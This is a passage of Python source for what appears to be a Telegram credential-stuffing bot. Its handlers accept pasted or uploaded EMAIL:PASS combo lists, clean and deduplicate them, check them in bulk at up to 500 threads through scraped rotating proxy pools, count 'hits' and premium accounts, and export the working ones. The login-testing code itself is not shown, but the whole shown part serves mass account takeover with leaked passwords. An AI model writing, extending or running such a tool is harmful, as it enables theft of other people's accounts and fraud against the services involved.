                    await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                    return
                try:
                    ban_id = int(text.strip().lstrip("@"))
                    BANNED_USERS.add(ban_id)
                    save_banned(BANNED_USERS)
                    await reply_menu(msg, f"🚫 Banned: <code>{ban_id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "admins", "danger")]])
                return
            if kind == "unbanuser":
                clear_pending(uid)
                if not is_owner(uid):
                    await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                    return
                try:
                    unban_id = int(text.strip().lstrip("@"))
                    BANNED_USERS.discard(unban_id)
                    save_banned(BANNED_USERS)
                    await reply_menu(msg, f"✅ Unbanned: <code>{unban_id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
                except Exception as e:
                    await reply_menu(msg, f"❌ Error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "admins", "danger")]])
                return
            if kind == "clean_check":
                clear_pending(uid)
                # user typed something after clean - treat as new input
                pass

            clear_pending(uid)

        # Auto-detect proxy text paste vs combo vs URL
        if text.strip().startswith("http") and " " not in text.strip() and "\n" not in text.strip() and len(text.strip()) < 500:
            # single URL — could be proxy list URL
            # check if it's not a credential
            if not extract_credentials(text):
                # try fetch as proxy URL
                await msg.reply_text("🌐 Detected URL — trying to fetch proxies...")
                fetched = await asyncio.to_thread(fetch_proxies_from_url, text.strip())
                if fetched and len(fetched) > 2:
                    ac = bool(STORE.get_setting("auto_check", True))
                    added, invalid = await asyncio.to_thread(add_proxies_to_pool, fetched, ac)
                    await reply_menu(msg, f"🌐 <b>Proxies from URL Auto-Detected</b>\n\nFetched: <code>{len(fetched)}</code> ➕ <code>{added}</code>\n📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
                    return

        proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
        if proxy_lines:
            maybe_creds = extract_credentials(text)
            if proxy_lines and not maybe_creds:
                ac = bool(STORE.get_setting("auto_check", True))
                added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
                await reply_menu(msg, f"📥 <b>Proxies Auto-Detected</b>\n\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code>\n📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
                return
        creds = extract_credentials(text)
        if creds:
            if len(creds) > MAX_PASTED_CREDS:
                await msg.reply_text(f"⚠️ Large: <code>{len(creds)}</code> combos — unlimited ♾️ processing...", parse_mode=ParseMode.HTML)
            # unlimited
            await _run_and_report(msg, uid, text)
            return
        if text.startswith("/"):
            mtext, rows = menu_main(uid, uname_ht)
            await reply_menu(msg, "🔘 Use buttons 👇\n\n" + mtext, rows)
            return
        return
    except Exception as e:
        logger.error("handle_text error: %s", e, exc_info=True)
        try:
            await update.effective_message.reply_text("⚠️ Error processing your message — try again.", parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        msg = update.effective_message
        if not user or not msg or not msg.document:
            return
        uid = user.id
        if uid in BANNED_USERS and not is_owner(uid):
            await reply_menu(msg, "🚫 <b>You are banned</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        uname_doc = getattr(user, "username", None)
        if not is_admin(uid, uname_doc):
            owner_contact2 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
            owner_url2 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
            await reply_menu(msg, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact2}", [[("💬 Contact Owner", owner_url2, "primary")]])
            return
        pending = get_pending(uid)

        if pending and pending.get("kind") == "addpx":
            doc_peek = msg.document
            note_peek = await msg.reply_text("📥 Downloading file...")
            try:
                tg_file_peek = await context.bot.get_file(doc_peek.file_id)
                tmp_path_peek = Path(tempfile.gettempdir()) / f"peek_{uid}_{int(time.time())}.txt"
                await tg_file_peek.download_to_drive(str(tmp_path_peek))
                text_peek = tmp_path_peek.read_text(encoding="utf-8", errors="ignore")
                tmp_path_peek.unlink(missing_ok=True)
            except Exception as e:
                await note_peek.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
                return
            combo_peek = extract_credentials(text_peek)
            if combo_peek:
                clear_pending(uid)
                try:
                    await note_peek.delete()
                except Exception:
                    try:
                        await note_peek.edit_text("📂 Detected combo file — starting check...")
                    except Exception:
                        pass
                await _run_and_report(msg, uid, text_peek)
                return
            clear_pending(uid)
            lines = [l.strip() for l in text_peek.splitlines() if l.strip()]
            if not lines:
                await note_peek.edit_text("❌ No proxies found in file.", parse_mode=ParseMode.HTML)
                return
            if len(lines) > MAX_PASTED_PROXIES:
                await note_peek.edit_text(f"❌ Too many lines (max {MAX_PASTED_PROXIES}).", parse_mode=ParseMode.HTML)
                return
            ac = bool(STORE.get_setting("auto_check", True))
            await note_peek.edit_text(f"🔍 Testing <code>{len(lines)}</code> proxies... (auto-check {'ON' if ac else 'OFF'})", parse_mode=ParseMode.HTML)
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
            status = "🔍 Auto-check started..." if ac else "Added (live check skipped)."
            await note_peek.edit_text(
                f"📥 <b>Proxies Uploaded</b>\n\n✅ Added: <code>{added}</code> • ⚠️ Invalid: <code>{invalid}</code>\n"
                f"📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n\n{status}",
                parse_mode=ParseMode.HTML
            )
            await reply_menu(msg, f"✅ Proxies ready! Pool: <code>{pool_size()}</code> • Live: <code>{proxy_count()}</code>",
                             [[("🧪 Test Proxies", "proxysettings", "success"), ("💎 Check Account", "check", "success")], [("⬅️ Menu", "menu", "danger")]])
            return

        if pending and pending.get("kind") == "clean":
            # clean file upload
            doc = msg.document
            note = await msg.reply_text("📥 Downloading file for cleaning...")
            try:
                tg_file = await context.bot.get_file(doc.file_id)
                tmp_path = Path(tempfile.gettempdir()) / f"clean_{uid}_{int(time.time())}.txt"
                await tg_file.download_to_drive(str(tmp_path))
                text = tmp_path.read_text(encoding="utf-8", errors="ignore")
                tmp_path.unlink(missing_ok=True)
            except Exception as e:
                await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
                return
            clear_pending(uid)
            cleaned, stats = clean_combos(text)
            if not cleaned:
                await note.edit_text("❌ No valid combos after cleaning.", parse_mode=ParseMode.HTML)
                return
            fd, path = tempfile.mkstemp(suffix=".txt", prefix="cleaned_")
            os.close(fd)
            Path(path).write_text(cleaned, encoding="utf-8")
            try:
                with open(path, "rb") as f:
                    await msg.reply_document(document=InputFile(f, filename="cleaned_combos.txt"),
                                             caption=f"🧹 Cleaned: {stats['cleaned']} | Dup: {stats['dup']} | Invalid: {stats['invalid']}")
                await note.delete()
            finally:
                Path(path).unlink(missing_ok=True)
            set_pending(uid, "clean_check")
            PENDING[uid]["cleaned_text"] = cleaned
            await reply_menu(msg, f"🧹 <b>Cleaned Stats</b>\nTotal: <code>{stats['total']}</code> → Clean: <code>{stats['cleaned']}</code>\nDup: <code>{stats['dup']}</code> Invalid: <code>{stats['invalid']}</code>\n\nCheck now?", [[("✅ Check Now", "checkcleaned", "success"), ("⬅️ Menu", "menu", "danger")]])
            return

        if pending and pending.get("kind") != "file":
            clear_pending(uid)
            pending = None
        if pending:
            clear_pending(uid)
        if not _has_access(uid, uname_doc):
            owner_contact_x = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a>" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
            await reply_menu(msg, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact_x}", [[("⬅️ Back", "menu", "danger")]])
            return

        doc = msg.document
        name = (doc.file_name or "unknown.txt").lower()
        if not name.endswith((".txt", ".log", ".json", ".csv", ".dat", ".lst")):
            await reply_menu(msg, "❌ Only <code>.txt / .log / .json / .csv / .dat</code> files allowed.",
                             [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return
        if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
            await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
                             [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return

        note = await msg.reply_text("📥 Downloading file...")
        try:
            tg_file = await context.bot.get_file(doc.file_id)
            tmp_path = Path(tempfile.gettempdir()) / f"crunchy_{uid}_{int(time.time())}.txt"
            await tg_file.download_to_drive(str(tmp_path))
            # handle large files: read with limit
            text = tmp_path.read_text(encoding="utf-8", errors="ignore")
            tmp_path.unlink(missing_ok=True)
        except Exception as e:
            await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>",
                                 parse_mode=ParseMode.HTML)
            return
        if not text.strip():
            await note.edit_text("❌ File is empty.")
            return
        proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
        combo_creds = extract_credentials(text)
        if proxy_lines and not combo_creds:
            ac = bool(STORE.get_setting("auto_check", True))
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
            await note.edit_text(f"📥 <b>Proxies Auto-Detected & Added</b>\n\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code>\n📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n\n{'🔎 Auto-check...' if ac else ''}", parse_mode=ParseMode.HTML)
            await reply_menu(msg, f"✅ Proxies ready! Pool: <code>{pool_size()}</code> • Live: <code>{proxy_count()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("💎 Check Account", "check", "success")], [("⬅️ Menu", "menu", "danger")]])
            return
        try:
            await note.delete()
        except Exception:
            pass
        await _run_and_report(msg, uid, text)
    except Exception as e:
        logger.error("handle_document error: %s", e, exc_info=True)
        try:
            await update.effective_message.reply_text("⚠️ Error processing file — try again.", parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global THREADS, REFRESH_STOP_REQUEST
    try:
        q = update.callback_query
        if not q:
            return
        user = q.from_user
        uid = user.id if user else 0
        if uid in BANNED_USERS and not is_owner(uid):
            try:
                await q.answer("🚫 You are banned", show_alert=True)
            except:
                pass
            return
        uname_btn = getattr(user, "username", None) if user else None
        data = q.data or ""
        m = q.message
        try:
            await q.answer()
        except Exception:
            pass

        if data == "stopcheck":
            if not is_admin(uid, uname_btn):
                try:
                    await q.answer("❌ Admin only", show_alert=True)
                except:
                    pass
                return
            with USER_LOCK:
                STOP_REQUEST[uid] = True
                PAUSE_REQUEST.pop(uid, None)
            try:
                await q.answer("🛑 Stopping...", show_alert=False)
            except:
                pass
            try:
                await m.edit_text("🛑 <b>Stopping...</b>\nCancelling scan...", parse_mode=ParseMode.HTML)
            except:
                pass
            return

        if data == "pausecheck":
            if not is_admin(uid, uname_btn):
                return
            with USER_LOCK:
                PAUSE_REQUEST[uid] = True
            try:
                await q.answer("⏸️ Pausing...", show_alert=False)
            except:
                pass
            await edit_menu(m, "⏸️ Pausing... Will pause after current batch", [[("▶️ Resume", "resumecheck", "success"), ("🛑 Stop", "stopcheck", "danger")]])
            return

        if data == "resumecheck":
            if not is_admin(uid, uname_btn):
                return
            with USER_LOCK:
                PAUSE_REQUEST.pop(uid, None)
            try:
                await q.answer("▶️ Resumed", show_alert=False)
            except:
                pass
            await edit_menu(m, "▶️ Resumed — continuing...", [[("🛑 Stop", "stopcheck", "danger"), ("⏸️ Pause", "pausecheck", "primary")]])
            return

        if data == "menu":
            text, rows = menu_main(uid, uname_btn)
            await edit_menu(m, text, rows)
            return
        elif data == "help":
            await edit_menu(m, help_text(), [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "check":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "creds")
            await edit_menu(m, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>\n\n✨ Auto clean + dedup + retry 2x + scoring", [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "file":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            clear_pending(uid)
            set_pending(uid, "file")
            await edit_menu(m, "📂 <b>Check File</b>\n\nSend me your file.\n\nUnlimited combos ♾️ + auto clean + dedup — kitna bhi check karo!", [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "cleancombos":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "clean")
            await edit_menu(m, "🧹 <b>Clean Combos</b>\n\nSend your combo list or file — I'll dedup, clean, remove invalid.\n\nReturns cleaned file + stats + option to check.", [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "checkcleaned":
            # check the cleaned text from pending
            pend = get_pending(uid)
            if pend and pend.get("cleaned_text"):
                cleaned_text = pend.get("cleaned_text")
                clear_pending(uid)
                # need original message object — use callback message's chat
                # we have to use m.reply_text via context? We'll use edit and then run
                await edit_menu(m, "✅ <b>Starting check with cleaned combos...</b>", None)
                # create a dummy message-like object using m
                # Use _run_and_report with m as msg (it will reply)
                await _run_and_report(m, uid, cleaned_text)
                return
            else:
                await edit_menu(m, "❌ No cleaned combos found. Send again.", [[("🧹 Clean", "cleancombos", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        elif data == "tools":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            ttext, trows = menu_tools()
            await edit_menu(m, ttext, trows)
            return
        elif data == "status":
            await edit_menu(m, status_text(), [[("📊 Proxy Stats", "proxystats", "primary"), ("📅 Daily", "dailystats", "primary")], [("⬅️ Back", "menu", "danger")]])
            return
        elif data == "proxysettings":
            if not is_admin(uid, uname_btn):
                owner_contact3 = f"<a href=\"https://t.me/{OWNER_USERNAME.lstrip('@')}\">{OWNER_USERNAME}</a> (<code>{OWNER_ID}</code>)" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"<code>{OWNER_ID}</code>"
                owner_url3 = f"https://t.me/{OWNER_USERNAME.lstrip('@')}" if OWNER_USERNAME and OWNER_USERNAME != "@unknown" and OWNER_USERNAME.lstrip("@") else f"tg://user?id={OWNER_ID}"
                await edit_menu(m, f"❌ <b>Access Denied</b>\nOwner/Admins only.\nContact: {owner_contact3}", [[("💬 Contact Owner", owner_url3, "primary")]])
                return
            text, rows = menu_owner()
            await edit_menu(m, text, rows)
            return
        elif data == "opanel":
            text, rows = menu_owner()
            await edit_menu(m, text, rows)
            return
        elif data == "pool":
            await edit_menu(m, "ℹ️ Use <b>⚙️ Proxy Settings</b>.", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        elif data == "stoprefresh":
            # Stop option during refreshing proxy - fixes user request
            REFRESH_STOP_REQUEST = True
            try:
                await q.answer("🛑 Stopping proxy refresh...", show_alert=False)
            except:
                pass
            await edit_menu(m, "🛑 <b>Stopping proxy refresh...</b>\nPlease wait, cancelling...", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
            return

        elif data == "addpx":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "addpx")
            await edit_menu(m, "📥 <b>Upload Proxies</b>\n\nPaste lines (one per line):\n<code>host:port</code> or <code>user:pass@ip:port</code>\nor send URL or <code>.txt</code> file\n\nScoring + auto-check enabled", [[("⬅️ Back", "proxysettings", "danger")]])
            return
        elif data == "importurl":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "importurl")
            await edit_menu(m, "🌐 <b>Import Proxies from URL</b>\n\nSend a URL that returns proxy list (one per line).\n\nExample: <code>https://example.com/proxies.txt</code>", [[("⬅️ Back", "proxysettings", "danger")]])
            return
        elif data == "proxystats":
            # proxy stats detailed
            try:
                with PROXY_LOCK:
                    live = len(LIVE_PROXIES)
                    auto_c = len(AUTO_PROXY_URLS)
                    manual_c = len(MANUAL_PROXY_URLS)
                    scores = dict(PROXY_SCORES)
                top = sorted(scores.items(), key=lambda x: x[1], reverse=True)[:5]
                top_text = "\n".join([f"• <code>{esc(k[:40])}</code> → {v}" for k,v in top]) if top else "<i>No scores yet</i>"
                low = sorted(scores.items(), key=lambda x: x[1])[:3]
                low_text = "\n".join([f"• <code>{esc(k[:40])}</code> → {v}" for k,v in low]) if low else ""
                txt = (
                    f"📊 <b>Proxy Stats</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 Live: <code>{live}</code> • Auto: <code>{auto_c}</code> • Manual: <code>{manual_c}</code>\n"
                    f"📦 Pool: <code>{pool_size()}</code> • Scores: <code>{len(scores)}</code>\n"
                    f"🧵 Threads: <code>{THREADS}</code> • Uptime: <code>{uptime()}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏆 Top 5 Proxies:\n{top_text}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚠️ Lowest 3:\n{low_text}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💾 Scores file: <code>{PROXY_SCORES_FILE}</code>\n"
                )
                await edit_menu(m, txt, [[("🔄 Refresh", "refresh", "primary"), ("⚙️ Settings", "proxysettings", "primary")], [("⬅️ Back", "menu", "danger")]])
            except Exception as e:
                await edit_menu(m, f"❌ Stats error: <code>{esc(str(e))}</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "dailystats":
            daily = load_daily_stats()
            txt = (
                f"📅 <b>Daily Stats</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"📅 Date: <code>{daily.get('date')}</code>\n"
                f"✅ Hits: <code>{daily.get('hits',0)}</code>\n"
                f"🔍 Checks: <code>{daily.get('checks',0)}</code>\n"
                f"📊 Scans: <code>{daily.get('total',0)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Session Hits: <code>{TOTAL_HITS}</code>\n"
                f"✅ Session Checks: <code>{CHECKS_DONE}</code>\n"
                f"⏱ Uptime: <code>{uptime()}</code>\n"
            )
            await edit_menu(m, txt, [[("📊 Bot Stats", "status", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        elif data == "history":
            hist = get_history(uid)
            if not hist:
                await edit_menu(m, "📜 <b>No history yet</b>\n\nDo some checks first!", [[("⬅️ Back", "menu", "danger")]])
                return
            txt2 = "📜 <b>Last 5 Checks</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            for h in reversed(hist):
                t = h.get("time","")[:16].replace("T"," ")
                txt2 += f"• {t} — Total: <code>{h.get('total')}</code> Hits: <code>{h.get('hits')}</code> CPM: <code>{h.get('cpm')}</code> {h.get('seconds')}s\n"
            await edit_menu(m, txt2, [[("⬅️ Back", "menu", "danger")]])
            return
        elif data == "cleandup":
            set_pending(uid, "clean")
            await edit_menu(m, "🧹 <b>Clean Duplicates</b>\n\nSend combo list or file.", [[("⬅️ Back", "tools", "danger")]])
            return
        elif data == "exporthits":
            await edit_menu(m, "📁 <b>Export</b>\n\nUse Check Account and you'll get TXT+JSON+CSV automatically.\n\nOr send /history to see past checks.", [[("⬅️ Back", "tools", "danger")]])
            return
        elif data == "exportall":
            await edit_menu(m, "📁 <b>Export All</b> — same as hits export, includes free accounts if Premium Only OFF.\n\nToggle in settings.", [[("⚙️ Settings", "settings", "primary"), ("⬅️ Back", "tools", "danger")]])
            return
        elif data == "settings":
            ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
            ap = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
            txt = (
                f"⚙️ <b>Settings</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔍 Auto-Check Proxies: <code>{'ON' if ac else 'OFF'}</code>\n"
                f"🔄 Auto-Load Proxies: <code>{'ON' if ap else 'OFF'}</code>\n"
                f"🧵 Threads: <code>{THREADS}</code> (max {MAX_THREADS_USER})\n"
                f"💎 Premium Only: <code>{'ON' if PREMIUM_ONLY_DEFAULT else 'OFF'}</code>\n"
                f"🌐 Live: <code>{proxy_count()}</code> Pool: <code>{pool_size()}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"Toggle below:"
            )
            rows = [
                [("🔍 Auto-Check: ON" if ac else "🔍 Auto-Check: OFF", "toggle_autocheck", "primary")],
                [("🔄 Auto-Load: ON" if ap else "🔄 Auto-Load: OFF", "autoproxy", "primary")],
                [("🧵 Set Threads", "setthreads", "primary")],
                [("⬅️ Back", "tools", "danger")],
            ]
            await edit_menu(m, txt, rows)
            return
        elif data == "toggle_autocheck":
            cur = bool(STORE.get_setting("auto_check", True)) if STORE else True
            STORE.set_setting("auto_check", not cur)
            await edit_menu(m, f"{'✅ Auto-Check ON' if not cur else '⏸️ Auto-Check OFF'}", [[("⚙️ Settings", "settings", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        elif data == "disableproxies":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            with PROXY_LOCK:
                LIVE_PROXIES.clear()
                AUTO_PROXY_URLS.clear()
                MANUAL_PROXY_URLS.clear()
                MANUAL_PX_IDX[0] = 0
            await edit_menu(m, "🔵 <b>Proxies Disabled</b>\n🌐 Live: <code>0</code> • Pool file kept (manual can be reloaded).", [[("📤 Upload Proxies", "addpx", "success"), ("⬅️ Back", "proxysettings", "danger")]])
            return
        elif data == "clearpool":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            await asyncio.to_thread(clear_pool)
            text, rows = menu_owner()
            await edit_menu(m, "🧹 <b>Pool cleared.</b>\n\n" + text, rows)
            return
        elif data == "autoproxy":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            cur = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
            STORE.set_setting("auto_proxy", not cur)
            STORE.save()
            text, rows = menu_owner()
            await edit_menu(m, f"{'✅ Auto Load ON' if not cur else '⏸️ Auto Load OFF'} — 24x7 auto-fetch {'enabled' if not cur else 'disabled'}\n\n" + text, rows)
            return
        elif data == "setthreads":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            await edit_menu(m, f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code> • Max {MAX_THREADS_USER}",
                            [[("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")],
                             [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")],
                             [("🧵 500", "threads_500", "success")],
                             [("⬅️ Back", "proxysettings", "danger")]])
            return
        elif data.startswith("threads_"):
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            try:
                val = int(data.split("_")[1])
                if 10 <= val <= MAX_THREADS_USER:
                    THREADS = val
                    try:
                        STORE.set_setting("threads", val)
                    except Exception:
                        pass
                    await edit_menu(m, f"✅ <b>Threads Set</b>\n🧵 Now: <code>{THREADS}</code> • ~<code>{THREADS*4} cpm</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
                    return
            except Exception:
                pass
            await edit_menu(m, "❌ Invalid.", [[("⬅️ Back", "proxysettings", "danger")]])
            return
        elif data == "refresh":
            if not is_admin(uid, uname_btn):
                await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            REFRESH_STOP_REQUEST = False
            REFRESH_STATE["start"] = time.time()
            await edit_menu(m, "🔄 <b>Refreshing proxies...</b>\n\n⏳ Gathering from 12 sources...\n📦 Queued 8000 candidates\n\nPress Stop to cancel", [[("🛑 Stop Refresh", "stoprefresh", "danger"), ("⬅️ Back", "proxysettings", "danger")]])
            async def _rp():
                while True:
                    await asyncio.sleep(1.2)
                    try:
                        tested = REFRESH_STATE.get("tested", 0)
                        total = REFRESH_STATE.get("total", 1000) or 1000
                        live = REFRESH_STATE.get("live", 0)
                        pct = int(tested / total * 100) if total else 0
                        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
                        elapsed = int(time.time() - REFRESH_STATE.get("start", time.time()))
                        rate = tested / max(1, elapsed)
                        eta = int((total - tested) / max(1, rate)) if rate else 0
                        await edit_menu(m, f"🔄 <b>Refreshing — Live</b>\n\n📦 Testing {tested}/{total} [{bar}] {pct}%\n🌐 Live: <code>{live}</code> | Rate: <code>{live}/{tested}</code>\n⏱ Elapsed: <code>{elapsed}s</code> | ETA: <code>{eta}s</code>\n⚡ 300 workers | Scoring ON\n\nPress Stop to cancel", [[("🛑 Stop Refresh", "stoprefresh", "danger"), ("⬅️ Back", "proxysettings", "danger")]])
                    except Exception:
                        break
            prog=asyncio.create_task(_rp())
            try:
                await asyncio.to_thread(refresh_live_proxies, True)
            finally:
                try: prog.cancel()
                except: pass
            elapsed = int(time.time() - REFRESH_STATE.get("start", time.time()))
            live = proxy_count()
            pool = pool_size()
            if REFRESH_STOP_REQUEST:
                await edit_menu(m, f"🛑 <b>Proxy Refresh Stopped</b>\n\n🌐 Live: <code>{proxy_count()}</code> | Pool: <code>{pool_size()}</code>\n⏱ Time: <code>{elapsed}s</code> | Tested {REFRESH_STATE.get('tested',0)}/{REFRESH_STATE.get('total',0)}\n\nStopped by user", [[("⚙️ Proxy Settings","proxysettings","primary"),("⬅️ Back","menu","danger")]])
            else:
                await edit_menu(m, f"✅ <b>Auto Proxies Ready — Real</b>\n\n🌐 Live: <code>{proxy_count() if 'proxy_count' in globals() else live}</code> | Pool: <code>{pool_size() if 'pool_size' in globals() else pool}</code> | Scores: <code>{len(PROXY_SCORES)}</code>\n⏱ Time: <code>{elapsed}s</code> | Tested {REFRESH_STATE.get('tested',0)}/{REFRESH_STATE.get('total',0)}\n⚡ 300 workers | 1:1 ready | Scoring", [[("⚙️ Proxy Settings","proxysettings","primary"),("⬅️ Back","menu","danger")]])
            return
        elif data == "admins":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            admins = STORE.get_admins() if STORE else []
            admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
            txt2 = "👥 <b>Admins — Owner Panel</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            txt2 += f"👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
            txt2 += "━━━━━━━━━━━━━━━━━━━━━\n"
            if admins or admins_u:
                for a in admins:
                    txt2 += f"• <code>{a}</code>\n"
                for u in admins_u:
                    txt2 += f"• @{u}\n"
            else:
                txt2 += "<i>No admins yet</i>\n"
            txt2 += f"━━━━━━━━━━━━━━━━━━━━━\n🚫 Banned: <code>{len(BANNED_USERS)}</code>\n"
            txt2 += "<i>Tap Add/Remove/Ban to manage</i>"
            await edit_menu(m, txt2, [[("➕ Add Admin", "addadmin", "success"), ("➖ Remove Admin", "remadmin", "danger")], [("🚫 Ban", "banuser", "danger"), ("✅ Unban", "unbanuser", "success")], [("📢 Broadcast", "broadcast", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        elif data == "addadmin":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "addadmin")
            await edit_menu(m, "➕ <b>Add Admin</b>\n\nSend <code>USER_ID</code> or <code>@username</code>\nOr forward a message from the user.", [[("⬅️ Back", "admins", "danger")]])
            return
        elif data == "remadmin":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "remadmin")
            await edit_menu(m, "➖ <b>Remove Admin</b>\n\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
            return
